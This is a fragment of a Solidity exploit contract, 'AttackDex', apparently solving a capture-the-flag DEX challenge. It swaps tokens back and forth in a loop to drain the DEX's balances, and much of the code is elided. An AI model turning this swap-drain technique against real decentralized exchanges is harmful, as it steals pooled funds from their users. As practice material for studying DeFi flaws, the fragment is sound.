...
contract AttackDex{        
    ...
    function attack() public {        
        ...
        IERC20(token2).transferFrom(msg.sender, address(this), IERC20(token1).balanceOf(msg.sender));        

        dex.approve(address(dex), 9999); //allow dex contract to use our attacker's tokens                
        dex.swap(token2, token1, dex.balanceOf(token2, address(this))); //start player where all in token1
        ...
        while ((dex.balanceOf(token1,address(dex)) > 0)&&(dex.balanceOf(token2,address(dex)) > 0)) {
            console.log("------");
            console.log("token1:", dex.balanceOf(token1,address(this)));
            console.log("token2:", dex.balanceOf(token2,address(this)));
